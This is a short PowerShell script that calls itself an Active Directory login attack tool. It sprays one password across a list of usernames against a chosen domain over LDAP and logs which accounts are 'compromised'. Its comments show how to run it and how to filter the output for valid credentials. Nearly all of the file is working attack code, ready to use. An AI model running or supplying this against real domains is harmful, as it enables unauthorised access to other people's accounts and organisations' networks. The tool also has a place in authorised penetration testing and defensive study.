#A simple Active Directory login attack tool. It takes list of usernames and a password and tries to login with it against specified AD domain using LDAP (directoryservices).

#It retains results in a file in the current working directory, so it can be interrupted and resumed (it will not try to login again if the given user has already been compromised or tried with the given password).

#Import-Module .\adlogin.ps1

## Usage:
#adlogin <userlist.txt> <domain> <password>

## Example:
#adlogin users.txt domain.com P@ssw0rd

## Check results (find valid credentials):
#gc adlogin.*.txt | sls True

Function adcheck {
  param($u,$p)
  (new-object directoryservices.directoryentry "",$u,$p).psbase.name -ne $null
}
 
Function adlogin {
  param($userlist,$domain,$pswd)

  if (!$pswd) {
    Write-Host "usage: adlogin <userlist.txt> <domain> <password>"
    Write-Host " e.g.: adlogin users.txt domain.com P@ssw0rd`n"
    return
  }
  $results = ".\adlogin.$pswd.txt"

  foreach($line in gc $userlist) {
    $x = (gc $results -EA SilentlyContinue | sls "^$line,.*,True$")
    if ($x) {
      Write-Host "user $line already compromised"
      continue
    }
    $x = (gc $results | sls -CaseSensitive "^$line,$pswd,")
    if ($x) {
      Write-Host "user $line with $pswd already tried"
      continue
    }
    $output = "$line,$pswd,"
    $output += adcheck "$domain\$line" "$pswd"
    Write-Host "$output"
    echo $output >>$results
  }
}